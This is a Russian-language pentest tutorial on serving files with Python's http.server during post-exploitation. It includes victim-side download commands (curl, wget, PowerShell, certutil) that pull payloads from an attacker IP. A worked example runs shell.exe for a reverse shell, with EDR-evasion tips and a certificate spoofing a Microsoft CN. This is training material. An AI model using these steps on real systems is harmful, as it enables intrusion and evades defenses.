# Развёртывание Python HTTP-сервера для передачи файлов в пост-эксплуатации

## Контекст и базовые понятия

Передача файлов является критическим этапом в жизненном цикле тестирования на проникновение (pentest) и операций красной команды (Red Teaming). После получения начального доступа (Initial Access) или повышения привилегий (Privilege Escalation) атакующий часто нуждается в доставке на скомпрометированный хост дополнительных инструментов: шеллов, сканеров портов, эксплойтов, скриптов для lateral movement или утилит для сбора данных. Обратный процесс — эксфильтрация (exfiltration) собранных данных — также требует надежного канала передачи.

HTTP (Hypertext Transfer Protocol) исторически является одним из самых распространенных протоколов для передачи файлов в этих сценариях. Его популярность обусловлена тем, что HTTP-трафик (порты 80 и 443) практически всегда разрешен корпоративными межсетевыми экранами (Firewalls) и прокси-серверами как легитимный веб-трафик. В отличие от SMB (порт 445) или FTP (порт 21), которые часто блокируются или строго контролируются системами обнаружения вторжений (IDS/IPS), HTTP-соединения редко вызывают подозрений у сетевых администраторов, если не анализируются на уровне Deep Packet Inspection (DPI) или не проверяются через прокси с логированием.

Ключевое понятие, которое необходимо разграничить при работе с HTTP для передачи файлов, — это разница между **статическим веб-сервером** (используемым для доставки файлов) и **динамическим веб-приложением** (которое может принимать файлы).

В контексте пост-эксплуатации мы используем HTTP в режиме **unidirectional download** (однонаправленная загрузка). Стандартный HTTP-сервер, такой как `http.server` в Python, реализует протокол HTTP/1.1, который по умолчанию поддерживает методы `GET` (запрос данных) и `HEAD` (запрос заголовков). Метод `POST` или `PUT` (загрузка данных) требует специальной серверной логики (backend code), которая обрабатывает входящий поток и сохраняет его на диск. Без такой логики сервер просто вернет ошибку `405 Method Not Allowed` или `501 Not Implemented`. Поэтому для передачи файлов *на* скомпрометированный хост атакующий запускает HTTP-сервер на своей машине (или на промежуточном узле), а жертва выступает в роли HTTP-клиента, инициирующего запрос `GET`.

Для передачи файлов *с* скомпрометированного хоста (exfiltration) ситуация обратная: жертва должна быть HTTP-клиентом, отправляющим данные, а атакующий — сервером, принимающим их. Поскольку стандартный `http.server` не принимает загрузки, для этого сценария требуются либо кастомные скрипты, либо использование других протоколов (SMB, FTP), либо обходные пути через HTTP-клиенты, поддерживающие PUT, если сервер настроен соответствующим образом.

Ниже представлена сравнительная таблица, разграничивающая основные методы передачи файлов в пост-эксплуатации с точки зрения их применимости и ограничений.

| Метод передачи | Протокол / Порт | Направление (Attacker -> Victim) | Направление (Victim -> Attacker) | Требования к сети | Сложность развёртывания |
|---|---|---|---|---|---|
| **HTTP (Python SimpleServer)** | HTTP/80, 8000+ | ✅ (GET) | ❌ (требует кастомного сервера) | Разрешен исходящий HTTP/HTTPS | Низкая (встроенный модуль Python) |
| **HTTPS (Python + SSL)** | HTTPS/443, 8443+ | ✅ (GET) | ❌ (требует кастомного сервера) | Разрешен HTTPS, обходит DPI | Средняя (нужны сертификаты) |
| **SMB (Impacket smbserver)** | SMB/445 | ✅ (UNC paths) | ✅ (автоматически при доступе) | Разрешен SMB, часто блокируется | Низкая (встроенный в Impacket) |
| **FTP (pyftpdlib)** | FTP/21, 2121+ | ✅ (STOR) | ✅ (RETR) | Разрешен FTP, редко разрешен | Средняя (нужен внешний модуль) |
| **TFTP (atftpd)** | TFTP/69 | ✅ (GET) | ✅ (PUT) | Разрешен UDP/69, устаревший | Низкая (встроен в Kali) |
| **Netcat (nc)** | TCP/UDP (любой) | ✅ (redirect stdout) | ✅ (redirect stdin) | Любой порт, если проброшен | Низкая (зависит от наличия nc) |

В данном конспекте фокус сделан на HTTP-серверах на базе Python, так как Python присутствует по умолчанию на большинстве дистрибутивов Linux (включая Kali, Parrot OS) и часто устанавливается на Windows-машинах. Это делает его универсальным инструментом, не требующим установки дополнительного ПО на стороне атакующего.

## Внутреннее устройство предмета

Модуль `http.server` в Python 3 является частью стандартной библиотеки (stdlib) и предоставляет высокоуровневый интерфейс для создания HTTP-серверов. Он построен на базе модуля `socketserver`, который, в свою очередь, работает с низкоуровневыми сокетами. Понимание внутренней архитектуры этого модуля критично для настройки сервера под специфические условия пост-эксплуатации, такие как необходимость поддержки многопоточности или добавления TLS-шифрования.

### Архитектура модуля `http.server`

Основой является класс `HTTPServer`, который наследуется от `socketserver.TCPServer`. При инициализации `HTTPServer` создает TCP-сокет, привязывает его к указанному адресу (`server_address`) и начинает прослушивать входящие соединения.

```python
class http.server.HTTPServer(socketserver.TCPServer):
    def __init__(self, server_address, RequestHandlerClass, bind_and_activate=True):
        # ... инициализация сокета ...
```

Ключевым компонентом является `RequestHandlerClass`. Это класс, который определяет, как сервер будет обрабатывать каждый входящий HTTP-запрос. По умолчанию используется `BaseHTTPRequestHandler`. Этот класс парсит входящий поток байтов, извлекает метод запроса (`GET`, `POST`, `HEAD` и т.д.), заголовки и тело запроса.

Для обработки `GET`-запросов (скачивание файлов) используется метод `do_GET()`. В стандартной реализации `SimpleHTTPRequestHandler` (который наследуется от `BaseHTTPRequestHandler`) этот метод:
1. Извлекает путь из URL-адреса запроса.
2. Проверяет, существует ли файл по этому пути.
3. Устанавливает MIME-тип файла (например, `application/octet-stream` для бинарных файлов).
4. Отправляет HTTP-статус `200 OK`.
5. Отправляет заголовок `Content-Length`.
6. Читает файл блоками и записывает его в ответный поток (`wfile`).

### Многопоточность и производительность

Стандартный `HTTPServer` является синхронным. Это означает, что он обрабатывает один запрос за раз. Если клиент (например, браузер или `curl` с несколькими потоками) открывает несколько соединений, или если файл большой и передача идет медленно, сервер блокируется до завершения передачи текущего файла. В сценариях пост-эксплуатации это может привести к зависанию шелла или потере связи, если клиент ожидает быстрого ответа.

Для решения этой проблемы в Python 3.7+ был добавлен класс `ThreadingHTTPServer`. Он наследуется от `ThreadingMixIn` и `TCPServer`. При получении нового соединения он создает новый поток (thread) для обработки этого конкретного запроса. Это позволяет серверу обслуживать множество клиентов параллельно.

```python
from http.server import ThreadingHTTPServer, SimpleHTTPRequestHandler

# Создание многопоточного сервера
httpd = ThreadingHTTPServer(('0.0.0.0', 8000), SimpleHTTPRequestHandler)
httpd.serve_forever()
```

### HTTPS-сервер и TLS-обертка

Для обхода систем, блокирующих незашифрованный HTTP, или для снижения вероятности детектирования по сигнатурам трафика, часто требуется использовать HTTPS. Модуль `http.server` не имеет встроенного метода для автоматического создания HTTPS-сервера с одной командой, но предоставляет класс `HTTPSServer` (добавлен в Python 3.14) или позволяет вручную обернуть сокет с помощью модуля `ssl`.

Процесс создания HTTPS-сервера включает следующие шаги:
1. Генерация самоподписанного сертификата (self-signed certificate) с помощью `openssl`.
2. Загрузка сертификата и закрытого ключа в объект `ssl.SSLContext`.
3. Обертывание исходного TCP-сокета сервера с помощью `ssl.wrap_socket()` или `context.wrap_socket()`.

Это создает TLS-туннель поверх TCP, шифруя весь HTTP-трафик. Для клиента это выглядит как обычное HTTPS-соединение, хотя сертификат будет считаться недоверенным (untrusted) из-за отсутствия подписи CA.

### Структура HTTP-запроса и ответа

Понимание структуры пакетов необходимо для отладки и создания правил детектирования.

```text
[Client]                          [Server]
   |                                  |
   |  GET /payload.exe HTTP/1.1      |
   |  Host: 10.10.14.5:8000          |
   |  User-Agent: curl/7.68.0        |
   |                                  |
   |<---------------------------------|
   |  HTTP/1.0 200 OK                |
   |  Server: SimpleHTTP/0.6 Python/3.8|
   |  Date: Mon, 01 Jan 2024 12:00:00 GMT|
   |  Content-Type: application/octet-stream|
   |  Content-Length: 1048576          |
   |                                  |
   |<---------------------------------| (поток байтов файла)
```

Важно отметить, что `SimpleHTTPRequestHandler` по умолчанию отображает индексный файл (directory listing) при запросе корня директории (`/`). Это может быть полезно для навигации, но также раскрывает структуру файлов на сервере.

## Применение и работа с предметом

На практике развёртывание HTTP-сервера для передачи файлов сводится к нескольким типовым сценариям. Выбор команды зависит от операционной системы атакующего, версии Python и требований к безопасности (например, необходимость HTTPS).

### Запуск HTTP-сервера на Linux (Kali/Parrot)

Наиболее частый сценарий — атакующий использует Kali Linux. Python 3 предустановлен.

**Сценарий 1: Базовый HTTP-сервер на порту 8000**

```bash
# Переход в директорию с файлами для передачи
cd /path/to/payloads

# Запуск сервера
python3 -m http.server 8000
```

Эта команда запускает сервер, который слушает все интерфейсы (`0.0.0.0`) на порту 8000. Вывод в терминал будет содержать логи входящих запросов:
```
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.14.1 - - [01/Jan/2024 12:00:00] "GET /mimikatz.exe HTTP/1.1" 200 -
```

**Сценарий 2: Многопоточный сервер (для стабильности)**

```python
# Создаем скрипт server.py
from http.server import ThreadingHTTPServer, SimpleHTTPRequestHandler
import sys

port = 8080
handler = SimpleHTTPRequestHandler

# Изменяем рабочий каталог, если нужно
# handler.directory = '/path/to/files'

httpd = ThreadingHTTPServer(('0.0.0.0', port), handler)
print(f"Serving on port {port}")
httpd.serve_forever()
```

```bash
python3 server.py
```

Использование `ThreadingHTTPServer` предотвращает зависание сервера при одновременных запросах от нескольких клиентов или при использовании клиентом множественных соединений.

### Запуск HTTPS-сервера

Для обхода базовых фильтров прокси, которые могут блокировать HTTP-трафик на нестандартных портах, или для имитации легитимного веб-сервиса, используется HTTPS.

**Шаг 1: Генерация сертификата**

```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
```

**Шаг 2: Запуск HTTPS-сервера (Python 3.14+)**

```python
from http.server import HTTPSServer, SimpleHTTPRequestHandler
import ssl

port = 443
httpd = HTTPSServer(('0.0.0.0', port), SimpleHTTPRequestHandler,
                    certfile='cert.pem', keyfile='key.pem')
print(f"Serving HTTPS on port {port}")
httpd.serve_forever()
```

**Шаг 2 (альтернатива для старых версий Python 3):**

```python
import http.server
import socketserver
import ssl

port = 8443
Handler = http.server.SimpleHTTPRequestHandler

httpd = socketserver.TCPServer(("0.0.0.0", port), Handler)

ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
ctx.load_cert_chain(certfile='cert.pem', keyfile='key.pem')
httpd.socket = ctx.wrap_socket(httpd.socket, server_side=True)

print(f"Serving HTTPS on port {port}")
httpd.serve_forever()
```

### Операции на стороне жертвы (Клиент)

После запуска сервера атакующий должен инициировать загрузку файла на скомпрометированной машине. Выбор инструмента зависит от ОС жертвы.

**Linux/Unix жертва:**

```bash
# Использование curl
curl -O http://10.10.14.5:8000/payload.exe

# Использование wget
wget http://10.10.14.5:8000/payload.exe

# Использование python (если curl/wget отсутствуют)
python3 -c "import urllib.request; urllib.request.urlretrieve('http://10.10.14.5:8000/payload.exe', 'payload.exe')"
```

**Windows жертва:**

```powershell
# Использование PowerShell (по умолчанию в Windows 7+)
# Метод 1: Invoke-WebRequest (PowerShell 3.0+)
Invoke-WebRequest -Uri "http://10.10.14.5:8000/payload.exe" -OutFile "payload.exe"

# Метод 2: WebClient (PowerShell 2.0+)
(New-Object System.Net.WebClient).DownloadFile("http://10.10.14.5:8000/payload.exe", "payload.exe")

# Использование certutil (встроенная утилита Windows)
certutil -urlcache -split -f http://10.10.14.5:8000/payload.exe payload.exe
```

### Потенциальные проблемы и обходные пути

1. **Блокировка портов:** Если порт 8000 заблокирован фаерволом, можно использовать порты 80, 443, 8080 или 8443.
2. **Прокси-серверы:** Если жертва использует прокси, HTTP-запросы будут идти через него. Необходимо настроить прокси в клиенте (например, `export http_proxy=http://proxy:8080` в Linux или настройки IE/Edge в Windows).
3. **Антивирус/EDR:** Простая передача файла по HTTP может быть обнаружена EDR-системами по сигнатурам заголовков или по поведению процесса (например, `python.exe` скачивает файл). Использование `certutil` или `bitsadmin` на Windows менее подозрительно, так как эти утилиты легитимны для загрузки обновлений.

## Сквозной практический пример: Доставка шелла на Windows-хост через HTTPS

**Исходные условия:**
*   **Атакующий:** Kali Linux (IP: `10.10.14.5`), запущенный HTTP-сервер с поддержкой HTTPS.
*   **Жертва:** Windows 10 Pro (IP: `10.10.10.1`), скомпрометированный через RDP, права пользователя `user`.
*   **Цель:** Передать файл `shell.exe` (обфусцированный PowerShell-шелл) с машины атакующего на рабочий стол жертвы.
*   **Ограничения:** Корпоративный прокси блокирует HTTP-трафик на нестандартных портах, но разрешает HTTPS на порту 443. Антивирус блокирует запуск `python.exe` с сетевыми операциями.

**Шаг 1: Подготовка файлов и сертификата на Kali**

Атакующий создает директорию для файлов и генерирует самоподписанный сертификат.

```bash
mkdir /tmp/https_payloads
cd /tmp/https_payloads
cp /usr/share/windows-resources/binaries/shell.exe .
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj "/CN=windows-update.microsoft.com"
```

*Примечание:* Подмена `CN` (Common Name) на `windows-update.microsoft.com` может помочь обойти предупреждения браузера или некоторые базовые проверки сертификатов, если клиент доверяет корневому сертификату Microsoft.

**Шаг 2: Запуск HTTPS-сервера**

Создается скрипт `server.py` для запуска HTTPS-сервера на порту 443.

```python
#!/usr/bin/env python3
import http.server
import socketserver
import ssl
import sys

PORT = 443
Handler = http.server.SimpleHTTPRequestHandler

# Изменяем рабочий каталог на текущий
Handler.directory = '.'

httpd = socketserver.TCPServer(("0.0.0.0", PORT), Handler)

ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
ctx.load_cert_chain(certfile='cert.pem', keyfile='key.pem')
httpd.socket = ctx.wrap_socket(httpd.socket, server_side=True)

print(f"Serving HTTPS on port {PORT}...")
print(f"Files available: {Handler.directory}")
httpd.serve_forever()
```

Запуск от root (так как порт 443 привилегированный):

```bash
sudo python3 server.py
```

**Шаг 3: Загрузка файла на жертву с использованием легитимной утилиты**

На скомпрометированной Windows-машине атакующий использует `certutil`, так как эта утилита часто исключена из списков блокировки EDR для сетевых операций.

```powershell
# Подключение к RDP или выполнение через существующий шелл
certutil -urlcache -split -f https://10.10.14.5/shell.exe C:\Users\user\Desktop\shell.exe
```

*Артефакт (вывод на жертве):*
```
CertUtil: -URLCache command completed successfully.
```

*Артефакт (лог на сервере Kali):*
```
10.10.10.1 - - [01/Jan/2024 12:05:00] "GET /shell.exe HTTP/1.1" 200 -
```

**Шаг 4: Проверка и выполнение**

Атакующий проверяет наличие файла на жертве.

```powershell
dir C:\Users\user\Desktop\shell.exe
```

Затем выполняет его:

```powershell
C:\Users\user\Desktop\shell.exe
```

**Ожидаемый вывод:**
Атакующий получает обратный шелл (reverse shell) на своей машине (например, через Netcat или Metasploit), подтверждая успешную доставку и выполнение файла.

**Вывод по примеру:**
Использование HTTPS-сервера на порту 443 позволяет обойти блокировки прокси, а использование `certutil` на стороне жертвы снижает вероятность детектирования EDR по сравнению с использованием PowerShell или `curl`. Подмена CN сертификата добавляет элемент социальной инженерии для пользователя, если он увидит предупреждение о сертификате.

## Аналитический вывод

Развёртывание HTTP-сервера на базе Python является фундаментальной техникой в арсенале специалиста по тестированию на проникновение благодаря своей простоте, доступности и универсальности. Модуль `http.server` предоставляет готовый, надежный механизм для создания как HTTP, так и HTTPS-серверов без необходимости установки стороннего ПО. Ключевым преимуществом этого подхода является минимальный след на целевой системе, так как вся нагрузка по обработке запросов ложится на сторону атакующего, а жертва использует только стандартные клиентские утилиты (`curl`, `wget`, `certutil`, PowerShell).

Однако этот метод имеет существенные ограничения. Во-первых, стандартный `SimpleHTTPRequestHandler` поддерживает только методы `GET` и `HEAD`, что делает невозможной прямую загрузку файлов *на* сервер без кастомизации кода. Во-вторых, использование HTTP-трафика может быть обнаружено системами мониторинга сети, если не применяются техники обхода, такие как шифрование (HTTPS) или маскировка под легитимный трафик (подмена User-Agent, использование стандартных портов). В-третьих, антивирусные и EDR-системы все чаще блокируют запуск `python.exe` с сетевыми операциями или использование утилит вроде `certutil` для загрузки бинарных файлов, что требует применения техник обхода, таких как использование легитимных процессов (LOLBins) или обфускация кода.

Для успешного применения этой техники в реальных условиях необходимо учитывать сетевую архитектуру цели (наличие прокси, фаерволов), версию Python на целевой системе и уровень контроля со стороны средств защиты. Комбинирование HTTPS-сервера с использованием легитимных клиентских утилит на стороне жертвы представляет собой наиболее сбалансированный подход по соотношению эффективности и скрытности.
